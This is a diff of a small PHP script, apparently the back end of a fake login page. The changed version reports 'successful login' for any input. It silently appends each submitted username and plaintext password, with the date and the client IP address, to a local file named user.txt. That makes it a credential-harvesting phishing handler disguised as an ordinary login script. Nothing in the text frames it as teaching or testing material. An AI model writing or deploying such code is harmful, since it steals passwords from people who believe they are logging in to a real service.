@@ -1,21 +1,17 @@
-
 <?php
-echo 'username: ', $_POST['username'];
-echo '<br>';
-echo 'password: ', $_POST['password'];
-echo '<br>';
-echo  date('Y-m-d', time());
-echo '<br>';
 if (!empty($_SERVER['HTTP_CLIENT_IP']))
 {
-    echo $_SERVER['HTTP_CLIENT_IP'];
+    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
 }
 else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
 {
-    echo $_SERVER['HTTP_X_FORWARDED_FOR'];
+    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
 }
 else
 {
-    echo $_SERVER['REMOTE_ADDR'];
+    $ip_address = $_SERVER['REMOTE_ADDR'];
 }
+echo "successful login";
+file_put_contents('user.txt',  sprintf('username = %s, password = %s, date = %s, ip_address = %s', $_POST['username'],$_POST['password'],date('Y-m-d', time()),$ip_address), FILE_APPEND | LOCK_EX)
+//printf("username = %s\n, password = %s\n, date = %s\n, ip_address = %s\n", $_POST['username'],$_POST['password'],date('Y-m-d', time()),$ip_address)
 ?>
